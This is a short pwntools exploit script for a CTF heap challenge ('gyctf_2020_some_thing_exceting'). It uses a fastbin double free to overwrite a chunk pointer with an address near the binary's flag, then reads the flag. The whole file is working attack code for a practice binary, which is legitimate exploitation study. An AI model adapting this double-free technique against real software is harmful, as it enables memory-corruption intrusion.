from pwn import *
elf = ELF('./data/bin/heap23_35_gyctf_2020_some_thing_exceting')
p = process('./data/bin/heap23_35_gyctf_2020_some_thing_exceting')
libc = elf.libc
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
flag = 0x6020A8-0x10
def choice(c):
	p.recvuntil(':')
	p.sendline(str(c))

def add(ba_size,ba_content,na_size,na_content):
	choice(1)
	p.recvuntil(':')
	p.sendline(str(ba_size))
	p.recvuntil(':')
	p.send(ba_content)
	p.recvuntil(':')
	p.sendline(str(na_size))
	p.recvuntil(':')
	p.send(na_content)

def free(index):
	choice(3)
	p.recvuntil(':')
	p.sendline(str(index))

def show(index):
	choice(4)
	p.recvuntil(':')
	p.sendline(str(index))

add(0x50,'AAAAAAA',0x50,'BBBBBBB')
add(0x50,'aaa',0x50,'bbb')
free(0)
show(0)
free(1)
free(0)
add(0x50,p64(flag),0x50,'AAA')
add(0x50,'AA',0x50,'AAA')
add(0x50,'f',0x60,'AAAA')
show(0)
p.interactive()